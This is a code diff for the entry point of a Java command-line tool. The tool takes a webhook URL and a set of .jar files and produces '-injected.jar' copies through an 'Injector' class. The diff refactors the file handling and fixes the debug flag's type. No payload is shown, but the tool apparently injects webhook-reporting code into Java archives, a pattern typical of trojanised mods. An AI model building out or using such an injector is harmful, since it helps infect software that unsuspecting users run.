@@ -18,6 +18,7 @@ public class Main {
 
         parser.addArgument("-d", "--debug")
                 .required(false).setDefault(false)
+                .type(Boolean.class)
                 .help("Enable debug mode (prints stack traces)");
 
         parser.addArgument("-w", "--webhook")
@@ -41,28 +42,8 @@ public class Main {
         boolean debug = namespace.getBoolean("debug");
         String webhook = namespace.getString("webhook");
         List<File> files = namespace.getList("files");
-        for (File f : files) {
-            handleFile(f, webhook, debug);
-        }
-    }
 
-    private static void handleFile(File file, String webhook, boolean debug) throws Throwable {
-        if (file.isDirectory()) {
-            File[] files = file.listFiles();
-            if (files == null)
-                return;
-
-            for (File f : files) {
-                handleFile(f, webhook, debug);
-            }
-        }
-
-        if (!file.getName().endsWith(".jar")) {
-            System.err.println("File " + file.getPath() + " is not a jar file!");
-            System.exit(1);
-        }
-
-        FileInjector fileInjector = new FileInjector(file, new File(file.getAbsolutePath().replace(".jar", "-injected.jar")));
-        fileInjector.inject(webhook, debug);
+        Injector injector = new Injector(debug, webhook, files);
+        injector.inject();
     }
 }
